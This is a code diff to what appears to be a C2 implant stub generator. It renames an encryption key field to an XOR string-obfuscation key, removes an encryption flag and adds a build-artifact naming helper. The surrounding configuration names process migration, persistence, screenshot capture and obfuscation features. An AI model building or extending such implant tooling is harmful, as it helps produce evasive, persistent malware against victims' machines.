@@ -112,9 +112,10 @@ class StubConfig:
     migrate_target: str = ""           # PID or process name
     migrate_technique: str = "auto"    # auto | reflective | procwrite | fork
 
-    # C2 crypto
-    aes_key: str = ""                  # 32-char (16-byte hex shared secret)
-    use_encryption: bool = True
+    # String-obfuscation key. Not a cipher key: the built-in obfuscator XORs a
+    # string table with it. The session channel is encrypted by TLS alone —
+    # see "What does not work yet" in the README.
+    obfuscation_key: str = ""
 
     # Build
     compiler: str = "pyinstaller"      # pyinstaller | nuitka | script
@@ -187,6 +188,14 @@ class AgentStubGenerator:
 
     # -- compiler wrappers ---------------------------------------------------
 
+    def artifact_stem(self, config: StubConfig) -> str:
+        """Bare name the compiler writes, without any extension.
+
+        Exposed because `--name` is a slug of the operator's label, and a caller
+        collecting the build output has to look for the same spelling.
+        """
+        return _slug(config.name)
+
     def pyinstaller_stub(self, config: StubConfig) -> str:
         """Return a PyInstaller .spec-like one-file launcher."""
         # Import the agent module; the .py file is written separately.
@@ -255,7 +264,6 @@ class AgentStubGenerator:
             "include_screenshot": cfg.modules.get("screenshot", False),
             "platform": cfg.platform.lower(),
             "transport": cfg.transport.lower(),
-            "enc": cfg.use_encryption,
             "obf": cfg.obfuscation or "none",
             "persistence": cfg.persistence,
             "migration": cfg.migration,
@@ -372,7 +380,7 @@ def _log(msg, level="info"):
 class _Obfuscator:
     """String-table + XOR obfuscation with optional eval-time decryption."""
 
-    def __init__(self, key: str = "{{ cfg.aes_key or rnd_str(32) }}"):
+    def __init__(self, key: str = "{{ cfg.obfuscation_key or rnd_str(32) }}"):
         self._key = _enc(key or _sg.printable[:16])
         self._table: list[bytes] = []
 
